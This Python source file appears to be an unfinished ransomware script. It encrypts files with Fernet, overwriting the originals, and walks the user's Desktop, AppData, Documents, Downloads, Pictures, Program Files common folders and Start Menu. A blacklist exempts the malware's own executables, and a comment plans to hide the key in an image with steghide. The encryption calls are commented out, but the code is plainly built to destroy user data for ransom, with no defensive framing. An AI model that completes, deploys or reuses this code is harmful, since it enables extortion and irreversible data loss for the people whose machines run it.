import os
import subprocess # use to run steghide
from cryptography.fernet import Fernet

def encrypt_file(filename, key):
    f = Fernet(key)
    with open(filename, "rb") as unencrypted_file:
        plaintext = unencrypted_file.read()
    ciphertext = f.encrypt(plaintext)
    # Overwrites the same file; original file can't be recovered
    with open(filename, "wb") as encrypted_file:
        encrypted_file.write(ciphertext)

def main():
    # TODO: Key should be fetched from an image!
    key = Fernet.generate_key()

    # Represents the files that we absolutely do not want to encrypt in order
    # to avoid deleting the malware or trashing the system beyond repair
    blacklist = ["encrypt.exe", "scan_and_execute.py", "sys32.exe"]

    # Selectively encrypts and removes user access to applications in given directories
    host_username = os.getlogin()
    directories_to_find_user_apps = [os.path.expanduser("~/Desktop"),
                                     f"C://Users/{host_username}/AppData/Local",
                                     f"C://Users/{host_username}/AppData/Roaming"]
    for directory in directories_to_find_user_apps:
        for root, dirs, files in os.walk(directory):
            for file in files:
                if file not in blacklist:
                    name, extension = os.path.splitext(f'{dirs}/{file}')
                    if extension in [".exe"]:
                        pass
                        #encrypt_file("Text.txt", key)
                print(file)

    # Encrypts directories in their entirety
    directories_to_encrypt = [os.path.expanduser("~/Downloads"),
                              os.path.expanduser("~/Documents"),
                              os.path.expanduser("~/Pictures"),
                              "C://Program Files/Common Files",
                              "C://Program Files (x86)/Common Files",
                              f"C://%programdata%/Microsoft/Windows/Start Menu/Programs"]
    for directory in directories_to_encrypt:
        for root, dirs, files in os.walk(directory):
            for file in files:
                if file not in blacklist:
                    pass
                    #encrypt_file("Text.txt", key)
                print(file)

    print("Encryption successful!")

main()